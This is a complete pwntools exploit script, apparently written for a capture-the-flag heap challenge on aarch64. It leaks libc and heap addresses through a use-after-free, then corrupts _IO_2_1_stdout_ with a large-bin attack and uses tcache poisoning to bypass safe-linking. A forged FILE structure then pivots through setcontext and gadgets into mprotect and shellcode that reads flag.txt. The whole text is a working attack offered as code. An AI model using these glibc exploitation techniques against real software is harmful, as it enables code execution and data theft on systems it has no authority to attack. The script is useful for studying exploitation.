from pwn import *

context.arch = 'aarch64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chal', '''
#     # b *_IO_wdoallocbuf+52
#     brva 0xe00
#     brva 0xf94
#     brva 0x10a4
#     brva 0x11e8
#     continue
# ''')

# p = process('./chal')

p = remote('host.docker.internal', 21002)

def build_cell(number, area):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"Number: ", str(number).encode())
    p.sendlineafter(b"Area: ", str(area).encode())

def purge_cell(number):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"Number: ", str(number).encode())

def assign_cell(number, inmates):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"Number: ", str(number).encode())
    p.sendafter(b"Inmates: ", inmates)

def inspect_cell(number):
    p.sendlineafter(b">> ", b'4')
    p.sendlineafter(b"Number: ", str(number).encode())
    return p.recvuntil(b"Cell", drop=True)

glibc_e = ELF('./libc.so.6')

build_cell(0, 0x418)
build_cell(1, 0x18)
purge_cell(0)
build_cell(2, 0x18)
leaks = inspect_cell(0)
glibc_base_addr = u64(leaks[0:8])-0x1b0ea0
log.info(f"glibc base address: {hex(glibc_base_addr)}")
heap_base_addr = u64(leaks[0x10:0x18])-0x290
log.info(f"heap base address: {hex(heap_base_addr)}")
build_cell(3, 0x3f8)

build_cell(4,0x428)
build_cell(5,0x408)
build_cell(6,0x418)
build_cell(7,0x408)
purge_cell(4)
build_cell(8,0x438)
purge_cell(6)
assign_cell(4, p64(glibc_base_addr+0x1b0ea0)*2+p64(heap_base_addr+0x6d0)+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x68-0x20))
build_cell(9, 0x438)

build_cell(10, 0x208)
build_cell(11, 0x208)

target_addr = heap_base_addr+0x6d0
payload = flat({
    # fp
    0: {
        0x0: target_addr,
        0x8: target_addr+0x10,
        0x30: glibc_base_addr+glibc_e.symbols['setcontext']+160, # 0x0000000000041ca0: ldr x16, [x0, #0x1b8]; ldp x2, x3, [x0, #0xc8]; ldp x4, x5, [x0, #0xd8]; ldp x6, x7, [x0, #0xe8]; ldp x0, x1, [x0, #0xb8]; br x16;
        0x38: target_addr+0xe0+0xe8,
        0x60: target_addr+0xe0,
        0x88: glibc_base_addr+0x1b2560, # fp->_lock
        0xa0: target_addr+0xe0, # fp->_wide_data
        0xb8: [(target_addr)&(~0xfff), 0x1000],
        0xc8: [7, glibc_base_addr+glibc_e.sym.mprotect],
        0xd8: glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps'] # fp->vtable
    },
    # fp->_wide_data/fp->_wide_data->_wide_vtable
    0xe0: {
        0x8: target_addr+0xe0,
        0x18: 0, # fp->_wide_data->_IO_write_base
        0x20: 1, # fp->_wide_data->_IO_write_ptr
        0x68: glibc_base_addr+0x130348, # 0x0000000000130348: ldr x0, [x19]; ldr x1, [x0, #8]; ldr x1, [x1, #0x20]; blr x1;
        0xd8: glibc_base_addr+0x1303e4, # 0x00000000001303e4: blr x3; ldr x0, [x19]; add x2, sp, #0x18; mov w1, #0x6; ldr x3, [x0, #0x8]; ldr x3, [x3, #0x28]; blr x3;
        0xe0: target_addr+0xe0, # fp->_wide_data->_wide_vtable
        0xe8: asm('''
            adr x1, flag
            movn x0, #99
            mov x2, xzr
            mov x3, xzr
            mov x8, #56
            svc #0
            mov x1, x0
            mov x0, #1
            mov x2, xzr
            mov x3, #0x80
            mov x8, #71
            svc #0
            flag:
                .string "flag.txt"
        ''')
    }
}, filler=b'\x00', length=0x208)

purge_cell(10)
purge_cell(11)
assign_cell(11, p64(((heap_base_addr+0x1130)>>12)^(target_addr)))
build_cell(12, 0x208)
build_cell(13, 0x208)
assign_cell(13, payload)

purge_cell(1)
purge_cell(2)
assign_cell(2, p64(((heap_base_addr+0x2a0)>>12)^(glibc_base_addr+glibc_e.symbols['environ']-8)))
build_cell(14, 0x18)
build_cell(15, 0x18)

p.interactive()